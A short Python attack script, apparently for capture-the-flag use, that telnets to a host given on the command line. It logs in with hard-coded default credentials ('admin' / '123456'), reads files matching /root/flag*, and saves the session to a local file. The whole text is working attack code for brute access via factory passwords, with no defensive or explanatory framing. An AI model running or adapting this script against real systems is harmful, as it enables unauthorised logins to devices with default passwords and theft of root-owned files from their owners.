#!/usr/bin/env python 

import optparse
import pexpect

parser = optparse.OptionParser('usage%prog '+'-H <target host>')
parser.add_option('-H',dest='tgtHost',type='string',help='special target host')
(options,args)=parser.parse_args()
host=options.tgtHost
a='telnet '+str(host)
b='/home/TELNET.'+str(host)
child=pexpect.spawn(a)
child.expect("login:")
child.send("admin\r")
child.expect(".*assword:")
child.send("123456\r")
child.send("cat /root/flag*\r")
fp23=open(b,"wb")
child.logfile=fp23
child.send("exit\r")
child.expect(pexpect.EOF)
fp23.close()
